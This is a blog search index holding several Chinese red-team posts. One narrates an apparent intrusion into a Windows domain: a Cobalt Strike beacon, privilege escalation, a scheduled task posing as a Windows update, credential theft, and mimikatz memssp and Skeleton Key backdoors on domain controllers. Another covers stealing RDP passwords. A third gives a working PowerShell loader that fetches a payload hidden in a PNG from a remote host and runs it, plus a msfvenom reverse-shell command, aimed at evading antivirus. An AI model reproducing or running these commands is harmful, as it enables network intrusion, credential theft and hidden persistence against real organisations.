<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>一次小型 APT 内网域渗透</title>
      <link href="/2021/07/04/apt-redteam-1/"/>
      <url>/2021/07/04/apt-redteam-1/</url>
      
        <content type="html"><![CDATA[<blockquote><p>在内网渗透中拿到了域控就结束了吗？但实际上内网渗透中拿到域控才刚开始！如果是做 APT 需要对某个目标、某个部门、某个部门中的某个人进行渗透，这个时候就需要长时间去了解这个内网环境，对域内进行定向打击，需要花很长时间去熟悉一个内网框架的！所以说内网渗透的本质其实就是信息搜集。</p></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>首先是拿到了一个 <code>webshell</code>，目标当前机器无 <code>AV</code> ，然后上 <code>powershell</code> 弹到了 <code>CobaltStrike</code>：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/dSVxoo.png"><br>通过信息搜集发现是有域环境的：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/hmqFjS.png"><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/UtzF9C.png"></p><h2 id="令牌窃取拿到域控"><a href="#令牌窃取拿到域控" class="headerlink" title="令牌窃取拿到域控"></a>令牌窃取拿到域控</h2><p>在域渗透中有很多方式能够快速拿到域控，在本篇就写如何令牌窃取快速拿域控权限，以后有机会在写其他手段！<br>查询域管理员有两个用户：<code>x10</code> 、<code>Administrator</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group <span class="string">&quot;domain admins&quot;</span> /domain</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/CmIqfP.png"><br>查询域控制器发现有多台：<code>xxxxx-PDM$</code>  、<code>xxxxx-SERVER$</code> 、<code>xxx-DC$</code>、 <code>xx-SERVER$</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">net group <span class="string">&quot;domain controllers&quot;</span> /domain</span><br><span class="line">```    </span><br><span class="line">![](https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/CJbbHM.png)</span><br><span class="line">`ping` 域控的主机名分别得到了他们的 `IP`：</span><br><span class="line">```bash</span><br><span class="line">xxxxx-PDM192.168.2.105</span><br><span class="line">xxxxx-SERVER192.168.2.106</span><br><span class="line">xxx-DC192.168.2.107</span><br><span class="line">xx-SERVER192.168.2.104</span><br></pre></td></tr></table></figure><p>随后通过 <code>ms16-075</code> 提权到 <code>SYSTEM</code>：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/X5sAse.png"><br>然后做了一个定时任务保持权限不丢失 ：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell  schtasks /create /RL HIGHEST /F /tn <span class="string">&quot;Windows Server Update&quot;</span> /tr <span class="string">&quot;c:\windows\Temp\Cha\64.exe&quot;</span> /sc DAILY /mo 1 /ST 09:00 /RU SYSTEM</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/GXfWLf.png"><br>一般拿到一台机器的权限后立即做好权限维持，还有就是马上把当前机器里的各种文件、浏览器数据翻个底朝天（除了那些可能保存在浏览器中的账号密码，还有那些像浏览器收藏夹及历史记录里的一些内网铭感资产的链接也会对我们有所帮助）<br>通过把当前机器文件翻遍后找到了一些账号密码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Mssql：</span><br><span class="line">User ID=sa;Password=xxxxxxx</span><br><span class="line"></span><br><span class="line">门禁：</span><br><span class="line">user：admin，pass：xxxxxxxx</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/Vc1nJP.png"><br>还可以通过 <code>GPP</code>、查看核心机器共享文件里面有什么，这里主要是域控：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/YUuIXv.png"><br>可以看到共享组策略目录中其实包含里很多东西，一些域管理员可能会利用它对域内用户登陆时进行一些初始化操作，所以我们在域渗透的过程中首先都会去看看这个地方，看看有没有什么敏感信息文件：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/y9EyO8.png"><br>但是在本机器上没有翻到有价值的共享文件！之后通过查看当前机器有域管进程：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/SOTfIn.png"><br>随即注入进程让域管上线：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/VM35Nx.png"><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/z30GmA.png"><br>域管和域控建立 <code>IPC</code> ：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.2.105</span><br><span class="line">net use \\192.168.2.106</span><br><span class="line">net use \\192.168.2.107</span><br><span class="line">net use \\192.168.2.104</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/1cVG8I.png"><br>直接拿到四个域控：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">shell dir \\192.168.2.105\c$</span><br><span class="line">shell dir \\192.168.2.106\c$</span><br><span class="line">shell dir \\192.168.2.107\c$</span><br><span class="line">shell dir \\192.168.2.104\c$</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/ikgl0f.png"><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/EO66Rt.png"><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/N25UUo.png"><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/KtgM39.png"><br>通过扫描内网存活：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/4XTv9K.png"><br>然后通过中转让域控上线把：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/Vx6Qc1.png"><br>成功拿到域控：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/WkLC3Y.png"><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/6IiBAE.png"><br>这域基本上已经死了。</p><h2 id="域控权限维持"><a href="#域控权限维持" class="headerlink" title="域控权限维持"></a>域控权限维持</h2><p>为了能够长时间控制到当前域控，我留下了两个后门：<code>SSP</code>、<code>Skeleton Key</code> 。</p><h3 id="SSP-记录登陆到当前机器的所有账号密码"><a href="#SSP-记录登陆到当前机器的所有账号密码" class="headerlink" title="SSP 记录登陆到当前机器的所有账号密码"></a>SSP 记录登陆到当前机器的所有账号密码</h3><p><code>SSP</code> 即 <code>Security Support Provider</code>，通俗理解就是一个用于身份验证的 <code>dll</code> , 系统在启动时 <code>SSP</code> 会被加载到 <code>lsass.exe</code> 进程中 , 由于 <code>lsa</code> 可扩展 , 导致在系统启动时我们完全可以加载一个自定义的 <code>dll</code> , 比如 , 一个用于记录所有登录到当前系统的明文账号密码的 <code>dll</code>。<br>通过拿到域控，我留了一个 <code>SSP</code> 后门：目标无需重启，立即记录密码信息，如果当前机器重启则失效！直接注入 <code>ssp</code>，因为当前机器无杀软，实际情况下需要注意杀软情况：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; mimikatz privilege::debug</span><br><span class="line">beacon&gt; mimikatz misc::memssp</span><br><span class="line">beacon&gt; shell <span class="built_in">type</span> C:\Windows\System32\mimilsa.log</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/fgT5eL.png"><br>等待了许久终于有人登陆当前机器成功获取到了密码：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/4vAvAX.png"></p><h3 id="Skeleton-Key-万能密码后门"><a href="#Skeleton-Key-万能密码后门" class="headerlink" title="Skeleton Key - 万能密码后门"></a>Skeleton Key - 万能密码后门</h3><p>为了防止域控权限丢失，我还留下了一个 <code>Skeleton Key</code> 后门，这个也不算后门，只能算一个<code>万能密码</code>，原理就是通过在 <code>lsass</code> 进程中创建了一个万能密码，通过这个万能密码我们可以随时访问到当前域控！<br>通过 <code>mimikatz</code> 在域控制器上安装 <code>Skeleton Key</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; mimikatz privilege::debug</span><br><span class="line">beacon&gt; mimikatz misc::skeleton</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/B9Oajc.png"><br>安装成功后我们可以通过其他域内主机的普通域用户，使用万能账号域管用户：<code>a-xxxxx\administrator</code> 密码 <code>mimikatz</code> 利用 <code>IPC</code> 连接域控：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell net use \\xxxxx-PDM\c$ /user:<span class="string">&quot;a-xxxxx\administrator&quot;</span> <span class="string">&quot;mimikatz&quot;</span></span><br><span class="line">beacon&gt; shell dir \\xxxxx-PDM\c$</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/WhXbI9.png"></p><h2 id="域内信息搜集整理"><a href="#域内信息搜集整理" class="headerlink" title="域内信息搜集整理"></a>域内信息搜集整理</h2><p>为了能够梳理当前域内的信息，我使用的是 <code>BloodHound</code> 分析当前域环境的各个关系！<br>先下载：<a href="Neo4j">https://neo4j.com/artifact.php?name=neo4j-community-3.4.4-windows.zip</a><br>在 <code>cmd</code> 下输入命令 <code>neo4j.bat console</code> 启动 <code>Neo4j</code> 服务：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/R3VVMa.png"><br>这个时候访问本地 <code>web</code>：<code>http://127.0.0.1:7474/browser/</code>  ，默认账号密码为：<code>neo4j</code>（然后会让你修改一次密码）<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/2PknpV.png"><br>之后安装 <code>Bloodhound</code> ：<a href="Bloodhound">https://github.com/BloodHoundAD/BloodHound/releases/download/1.5.2/BloodHound-win32-x64.zip</a><br>下载完成后解压，进入目录找到 <code>BloodHound</code> 并运行：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/CPkCZW.png"><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/Gg08GR.png"><br>现在已经完成了安装！之后需要通过 <code>SharpHound.exe</code> 提权域内所有信息：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/2E3Hgq.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell C:\Windows\Temp\BloodHound.exe -c all</span><br></pre></td></tr></table></figure><p>在这期间它会进行大量的 <code>ldap</code> 查询域内数据，等运行完后会在当前目录下生成一个 <code>当前时间_BloodHound.zip</code> 的文件！但是发现出问题了，一直不能运行：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/KjFKTK.png"><br>通过分析才知道 <code>2012</code> 版本可以用这个，因为 <code>.net</code> 版本有问题.<br>没事，我们换种方法，通过 <code>csvde</code> 也能帮我们梳理域内信息，具体用法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">csvde -setspn [域的名字] -f [文件名].csv</span><br><span class="line">csvde -setspn A-xxxxx -f c:\windows\temp\domain.csv</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/jDqBlk.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">LDAP的存储规则：一般存储的是域的信息</span><br><span class="line">区分名（DN，Distinguished Name）一个条目的区分名称叫做“dn”或者叫做区分名。在一个目录中这个名称总是唯一的。</span><br><span class="line">CN=Common Nmae 为用户名或服务器名，最长可以到80个字符，可以为中文。</span><br><span class="line">OU=Organization Unit为组织单元，最多可以有四级，没级最长32个字符，可以为中文。</span><br><span class="line">O=Organization为组织名，可以3-64个字符长度。</span><br><span class="line">C=Country为国家名，可选，为2个字符长度。</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/YMgKHi.png"><br>还可以通过 <code>spn</code> 查询域内详细信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">查看当前域内所有的SPN： setspn  -Q  */*</span><br><span class="line">查看指定域 test.com 注册的SPN：setspn -T [域的名字] -Q */*</span><br><span class="line"></span><br><span class="line">setspn -T A-xxxxx -Q */*  &gt; c:\windows\temp\domain.txt</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/aJ5RxO.png"><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/zype63.png"><br>之所以要获取目标域的完整 <code>spn</code> 记录，核心就是为了摸清目标域内所有敏感机器资产的具体分布情况，这样方便我们后续单独对这些机器进行逐个“重点突破”，我们还可以拿着这些获取到的机器名，来快速完整探测当前域内的所有存活主机！<br>第一种方法当然也可以通过 <code>nbtscan</code> 来快速发现内网机器存活，通过 <code>nbtscan</code> 跑出来的结果发现机器名和域名能够帮我们快速识别哪些机器可能是在域内，哪些机器是我们后期要重点关照的：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/qiJidN.png"><br>第二种方式可以通过 <code>Metasploit</code> + <code>cs</code> 的 <code>socks</code> 来帮我探测内网主机存活是否存在域还是工作组以及是什么系统，关于 <code>Metasploit</code> 的使用我之前也发过相关文章到公众号，这个就不再多阐述：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use auxiliary/scanner/smb/smb_version</span><br><span class="line">msf6 &gt; <span class="built_in">set</span> rhosts 192.168.2.0/24</span><br><span class="line">msf6 &gt; <span class="built_in">set</span> threads 16（实际上根据情况，可以把线程调小点，因为我现在是凌晨，所以调到了最大）</span><br><span class="line">msf6 &gt; run</span><br><span class="line">msf6 &gt; services</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/Xbvvq4.png"><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/wnkgOT.png"><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/4XintF.png"><br>从上图可以看到，大部分系统都是 <code>XP</code> 这说明可以利用永恒之蓝，当然这都是后话了！<br>第三种方式可以通过 <code>dnsdump</code> 快速根据域内机器名获取到对应的 <code>IP</code> 是多少！<br><code>dnsdump</code> 下载地址是：<a href="dnsdump">https://github.com/dirkjanm/adidnsdump</a><br>大家可以根据实际情况可以把 <code>py</code> 文件打包成 <code>exe</code> 或者可以直接通过 <code>proxychains</code> + <code>socks</code> 也能运行！我这里就直接在当前机器运行 <code>exe</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dnsdump.exe -u 域名\域用户 -p 域密码  域控制器名 -r </span><br><span class="line"></span><br><span class="line">C:\Windows\temp\dnsdump.exe -u A-xxxxx\administrator -p password xxxxx-PDM -r</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/pcEVbm.png"><br>然后就会在当前路径下生成一个文件：<code>records.csv</code>:<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/4iP92m.png"><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/N4XxKF.png"><br>这个时候对应的<code>机器名</code>的对应 <code>IP</code> 就一目了然了！<br>当然还要去看看当前机器有哪些网段，<code>ipconfig /all</code> 是看不出到底还有哪些网段可以访问的，这个时候我们可以看看<code>路由</code>，分析<code>子网掩码</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">route <span class="built_in">print</span></span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/Pbzy8q.png"><br>还可以通过查看网络连接看看有没有和其他 <code>IP</code> 进行链接：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/c7PTFg.png"><br>这台机器很显然就只有 <code>192</code> 这个段！</p><h2 id="域内定向打击"><a href="#域内定向打击" class="headerlink" title="域内定向打击"></a>域内定向打击</h2><p>到这里内网渗透其实本质上已经结束了，但是实际上内网渗透拿到域控才刚开始，如果是做 <code>APT</code> 需要对某个区、某个部门、某个人的电脑进行渗透，这个时候就需要长时间去了解这个内网环境，找到你要攻击的人的主机/服务器对应在内网的那个<code>IP</code>，这是需要花很长时间去搜集信息的，所以说内网渗透的核心其实就是信息搜集！<br>实际上内网渗透这才刚开始，接下来对域内某台主机进行定向攻击渗透，会用到各种手段！<br>未完待续。。。</p><h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p><strong>若有好的建议和合作可以通过公众号与我联系！</strong><br>微信公众号：<code>渗透攻击红队</code><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/logo/vxgzh.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> redTeam </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redTeam </tag>
            
            <tag> APT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透中当 RDP 凭证没勾选保存，如何获取到明文凭证信息？</title>
      <link href="/2021/07/01/dumping-rdp-credentials/"/>
      <url>/2021/07/01/dumping-rdp-credentials/</url>
      
        <content type="html"><![CDATA[<blockquote><p>在内网渗透过程中常常会碰到当前跳板机有 <code>RDP</code> 的连接记录，有些管理员会勾选保存密码，这个时候就可以通过 <code>mimikatz</code> 来获取明文凭证；但有些管理员就不会勾选保存密码，这个时候我们如何获取到 <code>RDP</code> 的连接凭证？</p></blockquote><h2 id="SharpRDPThief"><a href="#SharpRDPThief" class="headerlink" title="SharpRDPThief"></a>SharpRDPThief</h2><p><code>SharpRDPThief</code> 是 <code>RDPThief</code> 的 <code>C#</code> 实现。它使用 <code>EasyHook</code> 将一个 <code>DLL</code> 注入 <code>mstsc.exe</code>，然后它会挂钩 <code>CryptProtectMemory api</code> 调用。<code>hook</code> 将从传递给 <code>CryptProtectMemory</code> 的地址中获取密码，然后通过 <code>EasyHook</code> 的 <code>IPC</code> 服务器将其发送到主进程。<br>目前这只是概念实现的证明，需要 <code>RDPHook.dll</code> 与 <code>SharpRDPThief.exe</code> 位于同一目录中。<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/eidnEI.jpg"><br>此时如果客户端使用了 <code>mstsc</code> 并输入了 <code>user</code>、<code>pass</code> ：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/Z28H8Q.jpg"><br><code>SharpRDPThief</code>  就会把 <code>RDPhook.dll</code> 注入到 <code>mstsc</code> 进程从而获取到 <code>user</code>、<code>pass</code>：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/ndCgdb.jpg"></p><h2 id="RdpThief"><a href="#RdpThief" class="headerlink" title="RdpThief"></a>RdpThief</h2><p><code>RdpThief</code> 本身是一个独立的 <code>DLL</code>，当它被注入到 <code>mstsc.exe</code> 进程中时，将执行 <code>API</code> 挂钩，提取明文凭据并将它们保存到文件中。<br>当在 <code>Cobalt Strike</code> 上加载 a<code>ggressor</code> 脚本时，三个新命令将可用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rdpthief_enable – 启用新 mstsc.exe 进程的心跳检查并注入它们。</span><br><span class="line">rdpthief_disable – 禁用新 mstsc.exe 的心跳检查，但不会卸载已加载的 DLL。</span><br><span class="line">rdpthief_dump – 打印提取的凭据（如果有就会打印出来）</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/1eGILs.jpg"><br>可能是我 <code>CS</code> 版本问题，把 <code>rdpthief_dump</code> 的结果复制到文本就能看到 <code>ip</code>、<code>user</code>、<code>pass</code> 了：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/mcIEbw.jpg"><br>它实际把凭据保存到了 <code>%temp%\data.bin</code> 文件里：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/cFDiFO.jpg"><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/7SrA0T.jpg"></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.mdsec.co.uk/2019/11/rdpthief-extracting-clear-text-credentials-from-remote-desktop-clients/">https://www.mdsec.co.uk/2019/11/rdpthief-extracting-clear-text-credentials-from-remote-desktop-clients/</a><br><a href="https://github.com/0x09AL/RdpThief">https://github.com/0x09AL/RdpThief</a><br><a href="https://github.com/passthehashbrowns/SharpRDPThief">https://github.com/passthehashbrowns/SharpRDPThief</a></p><h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p><strong>若有好的建议和合作可以通过公众号与我联系！</strong><br>微信公众号：<code>渗透攻击红队</code><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/logo/vxgzh.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> RedTeam </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
            <tag> 红队技术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shellcode 隐写到像素 RGB 免杀上线到 CobaltStrike、Metasploit</title>
      <link href="/2021/06/27/bypass-image-rgb/"/>
      <url>/2021/06/27/bypass-image-rgb/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>一般来说一些 <code>AV</code> 对于图片并未做检测处理，其原理可以仅使用有效载荷数据来创建新图像，也可以将有效载荷嵌入到现有图像的最低有效字节中，以便看起来像实际的图片。图像保存为<code>PNG</code>，并且可以无损压缩，而不会影响执行有效载荷的能力，因为数据本身以颜色存储。创建新图像时，通常会对常规 <code>PowerShell</code> 脚本进行显着压缩，通常会生成 <code>png</code>，其文件大小约为原始脚本的50％，非常方便。</p></blockquote><h2 id="CobaltStrike-免杀"><a href="#CobaltStrike-免杀" class="headerlink" title="CobaltStrike 免杀"></a>CobaltStrike 免杀</h2><p>首先生成一个 <code>ps1</code> 的文件：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/IVWClM.jpg"><br>然后把生成的文件放到和 <code>Invoke-PSImage.ps1</code> 文件同一目录：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/pqBsy4.jpg"><br>然后再准备一张普通图片用于生成一个带有 <code>Payload</code> 的图片：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/LE8g1U.jpg"><br>之后使用命令生成一个带有 <code>shellcode</code> 的图片：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1、设置执行策略</span></span><br><span class="line">Set-ExecutionPolicy Unrestricted -Scope CurrentUser</span><br><span class="line"><span class="comment"># 2、导入 ps1 文件</span></span><br><span class="line">Import-Module .\Invoke-PSimage.ps1</span><br><span class="line"><span class="comment"># 3、生成 shellcode 的图片</span></span><br><span class="line">Invoke-PSImage -Script .\payload.ps1 -Image .\saulGoodman.jpg -Out .\saulGoodman.png -Web</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/8L6DE2.jpg"><br>之后就会得到这么一串 <code>Powershell</code> 代码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sal a New-Object;Add-Type -A System.Drawing;<span class="variable">$g</span>=a System.Drawing.Bitmap((a Net.WebClient).OpenRead(<span class="string">&quot;http://example.com/saul.png&quot;</span>));<span class="variable">$o</span>=a Byte[] 3584;(0..13)|%&#123;foreach(<span class="variable">$x</span> <span class="keyword">in</span>(0..255))&#123;<span class="variable">$p</span>=<span class="variable">$g</span>.GetPixel(<span class="variable">$x</span>,<span class="variable">$_</span>);<span class="variable">$o</span>[<span class="variable">$_</span>*256+<span class="variable">$x</span>]=([math]::Floor((<span class="variable">$p</span>.B-band15)*16)-bor(<span class="variable">$p</span>.G -band 15))&#125;&#125;;IEX([System.Text.Encoding]::ASCII.GetString(<span class="variable">$o</span>[0..3550]))</span><br></pre></td></tr></table></figure><p>当前目录还会多出了一个 <code>saul.png</code> 的图片：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/zlP34Y.jpg"><br>我们把里面的 <code>http://example.com/saul.png</code> 修改为我们自己的 <code>http</code> 服务，我首先再服务器上开启了一个 <code>http</code> 服务，然后把生成的 <code>saul.png</code> 放到里面用于远程加载：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/q2QKfl.jpg"><br>这个时候我们修改 <code>powershell</code> 代码为我们自己的 <code>http</code> ：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sal a New-Object;Add-Type -A System.Drawing;<span class="variable">$g</span>=a System.Drawing.Bitmap((a Net.WebClient).OpenRead(<span class="string">&quot;http://192.168.2.14/saul.png&quot;</span>));<span class="variable">$o</span>=a Byte[] 3584;(0..13)|%&#123;foreach(<span class="variable">$x</span> <span class="keyword">in</span>(0..255))&#123;<span class="variable">$p</span>=<span class="variable">$g</span>.GetPixel(<span class="variable">$x</span>,<span class="variable">$_</span>);<span class="variable">$o</span>[<span class="variable">$_</span>*256+<span class="variable">$x</span>]=([math]::Floor((<span class="variable">$p</span>.B-band15)*16)-bor(<span class="variable">$p</span>.G -band 15))&#125;&#125;;IEX([System.Text.Encoding]::ASCII.GetString(<span class="variable">$o</span>[0..3550]))</span><br></pre></td></tr></table></figure><p>然后运行上线的 <code>powershell</code> 代码上线：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/q3QyT7.jpg"><br><code>MSF</code>的话就生成这个：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1、msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.253.8 LPORT=5555 -f psh-reflection &gt; msf-dayu.ps1</span><br><span class="line"></span><br><span class="line">2、Set-ExecutionPolicy Unrestricted -Scope CurrentUser</span><br><span class="line"></span><br><span class="line">3、Import-Module .\Invoke-PSimage.ps1</span><br><span class="line"></span><br><span class="line">4、Invoke-PSImage -Script .\cs-dayu.ps1 -Image .\dayu.jpg -Out .\cs-dayu.png -Web</span><br></pre></td></tr></table></figure><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://github.com/dayuxiyou/Invoke-PSImage">https://github.com/dayuxiyou/Invoke-PSImage</a></p><p><a href="https://www.freebuf.com/articles/web/262978.html">https://www.freebuf.com/articles/web/262978.html</a></p><h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p><strong>若有好的建议和合作可以通过公众号与我联系！</strong><br>微信公众号：<code>渗透攻击红队</code><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/logo/vxgzh.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> Bypass </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Bypass </tag>
            
            <tag> 免杀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从外网代码审计到三层内网各种漏洞拿到域控</title>
      <link href="/2021/06/09/redTeam-1/"/>
      <url>/2021/06/09/redTeam-1/</url>
      
